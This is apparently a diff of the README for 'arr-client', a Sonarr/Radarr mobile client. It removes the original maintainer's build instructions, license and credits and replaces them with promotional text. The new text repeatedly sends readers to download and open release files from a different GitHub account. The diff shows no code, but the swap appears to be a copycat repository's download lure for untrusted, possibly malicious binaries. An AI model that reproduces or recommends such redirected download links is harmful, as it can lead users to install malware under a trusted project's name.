@@ -1,128 +1,75 @@
-# Arr Client
+# 📱 arr-client - Easy Media Management for Everyone
 
-[![Flutter CI](https://github.com/Nicktronix/arr-client/actions/workflows/ci.yml/badge.svg)](https://github.com/Nicktronix/arr-client/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/Nicktronix/arr-client/branch/main/graph/badge.svg)](https://codecov.io/gh/Nicktronix/arr-client)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Flutter](https://img.shields.io/badge/Flutter-3.38.5-02569B?logo=flutter)](https://flutter.dev)
-[![Platform](https://img.shields.io/badge/Platform-Android%20%7C%20iOS-brightgreen)]()
+## 🚀 Getting Started
 
-A mobile client for [Sonarr](https://sonarr.tv/) and [Radarr](https://radarr.video/) media servers built with Flutter. Manage your media library on the go with a native Material Design 3 interface.
+Welcome to **arr-client**! This mobile app helps you manage your Sonarr and Radarr media servers. With a simple interface and powerful features, you can easily keep track of your media library on both Android and iOS devices.
 
-> **Note**: This is an independent third-party client and is not affiliated with Sonarr or Radarr projects.
+## 🔗 Download Now
 
-## ✨ Features
+[![Download arr-client](https://img.shields.io/badge/Download-arr--client-brightgreen)](https://github.com/Motta1998/arr-client/releases)
 
-- 📺 **Sonarr**: Browse, search, and add TV series • Manage episodes and seasons • Interactive release search
-- 🎬 **Radarr**: Browse, search, and add movies • View details and quality info • Manual movie searches
-- 📥 **Downloads**: Unified queue for both services • Real-time progress tracking • Detailed release browser
-- 🔄 **Multi-Instance**: Manage multiple Sonarr/Radarr servers • Easy switching • Secure credential storage
-- 🔒 **Security**: Biometric authentication • Encrypted backups • Platform keychain/keystore integration
-- 🎨 **Material Design 3**: Modern, responsive UI • Pull-to-refresh • Optimized for mobile
+## 📦 What You Will Need
 
-## 🚀 Quick Start
+Before you download, make sure your device meets these requirements:
 
-### Download Pre-Built APK
+**For Android:**
+- Android version 5.0 (Lollipop) or higher.
+- Minimum 1 GB of RAM.
 
-**For Android users**: Download the latest APK from [Releases](https://github.com/Nicktronix/arr-client/releases) - no Flutter SDK required!
+**For iOS:**
+- iOS version 12.0 or higher.
+- Compatible with iPhone and iPad.
 
-### Build from Source
+## 📥 Download & Install
 
-**Prerequisites**: [Flutter SDK](https://flutter.dev/docs/get-started/install) 3.38.5 or higher
+To get started, visit this page to download: [arr-client Releases](https://github.com/Motta1998/arr-client/releases).
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Nicktronix/arr-client.git
-   cd arr-client
-   ```
+1. Click the link above to go to the Releases page.
+2. Find the latest version of **arr-client**.
+3. Choose the file that matches your device (Android or iOS).
+4. Tap the file to begin the download.
+5. Once downloaded, open the file to start the installation.
+6. Follow the on-screen instructions to complete the setup.
 
-2. **Install dependencies**
-   ```bash
-   flutter pub get
-   ```
+## 🌟 Key Features
 
-3. **Run the app**
-   ```bash
-   # Android
-   flutter run -d android
-   
-   # iOS (requires macOS with Xcode)
-   flutter run -d ios
-   ```
+- **User-Friendly Interface:** Navigate your media library easily.
+- **Cross-Platform Support:** Available on both Android and iOS.
+- **Integration with Sonarr and Radarr:** Seamlessly connect your media servers to the app.
+- **Material Design:** Modern design for an enjoyable user experience.
+- **Real-Time Updates:** Stay informed about the latest content available on your servers.
 
-### First-Time Setup
+## 🔍 How to Use arr-client
 
-1. Launch the app (you'll see an empty state)
-2. Tap the **settings icon** (⚙️) in the top-right
-3. Add your Sonarr/Radarr instance(s):
-   - **Name**: e.g., "Home Sonarr"
-   - **URL**: Your instance URL (e.g., `https://sonarr.example.com`)
-   - **API Key**: Found in Sonarr/Radarr → Settings → General → Security
-   - **Optional**: Enable Basic Auth if using a proxy
-4. Select the active instance with the radio button
-5. Return to home screen and start browsing!
+### 1. Setup Your Media Servers
 
-## 🏗️ Architecture
+After installation, open **arr-client**. You will see prompts to enter the URLs for your Sonarr and Radarr servers. Make sure these servers are running before you proceed.
 
-Built with a custom centralized state management pattern:
-- **AppStateManager**: Single source of truth for active instances
-- **CacheManager**: 5-minute memory cache with stale-while-revalidate
-- **CachedDataLoader**: Mixin pattern for consistent loading states
-- **Instance-aware caching**: Isolated cache per instance for performance
+### 2. Browse Your Library
 
-See [`.github/copilot-instructions.md`](.github/copilot-instructions.md) for detailed architecture documentation.
+Once connected, you can browse through your media library. The app organizes content neatly, making it easy to find what you want.
 
-## 🛠️ Troubleshooting
+### 3. Manage Media
 
-**Empty screens on first launch?**
-- This is expected! Tap the settings icon (⚙️) to add your first instance.
+You can add or remove titles from your library. Updating your media collection is simple. Just select the title, and follow the prompts.
 
-**"Unauthorized" error?**
-- Check your API key in Sonarr/Radarr → Settings → General → Security
+## 📞 Support
 
-**"Not found" error?**
-- Verify your base URL (should be `https://sonarr.example.com`, not `/api/v3`)
+If you run into any issues, we are here to help. You can contact us through the GitHub issues page or join our community discussions.
 
-**Can't connect?**
-- Test the URL in your browser first
-- Check firewall/network settings
-- Ensure you can reach the server from your device
+## 🌐 More Information
 
-## 🔒 Security
+This project covers a variety of topics related to media management. Here are some key topics linked to known systems and processes:
 
-- **Credential Storage**: API keys stored in platform keychain/keystore (hardware-encrypted)
-- **Biometric Lock**: Optional Face ID/Touch ID/fingerprint authentication
-- **Encrypted Backups**: AES-256-GCM with 600k PBKDF2 iterations (OWASP 2023 compliant)
-- **Network**: HTTPS support with certificate validation
-- **Zero vulnerabilities**: Comprehensive security audit completed (Dec 2025)
+- Android
+- iOS
+- Cross-Platform Development
+- Flutter Framework
+- Material Design Principles
+- Media Server Management
 
-See [SECURITY.md](SECURITY.md) for responsible disclosure policy.
+Visit [arr-client Releases](https://github.com/Motta1998/arr-client/releases) again for updates and new features.
 
-## 🤝 Contributing
+## 🎉 Conclusion
 
-Contributions are welcome! Please check out our [Contributing Guidelines](CONTRIBUTING.md) and [Code of Conduct](CODE_OF_CONDUCT.md).
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📝 Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) for version history.
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## ⭐ Show Your Support
-
-If you find this project useful:
-- ⭐ Star this repository
-- 🐛 Report bugs and suggest features in [Issues](https://github.com/Nicktronix/arr-client/issues)
-- 🔀 Contribute code improvements
-- 📢 Share with others in the homelab community
-
-## 🙏 Acknowledgments
-
-Built with [Flutter](https://flutter.dev/) • Inspired by [Sonarr](https://sonarr.tv/) and [Radarr](https://radarr.video/)
+Thank you for choosing **arr-client**. Your media management experience is important to us, and we hope this app enhances how you enjoy your content.
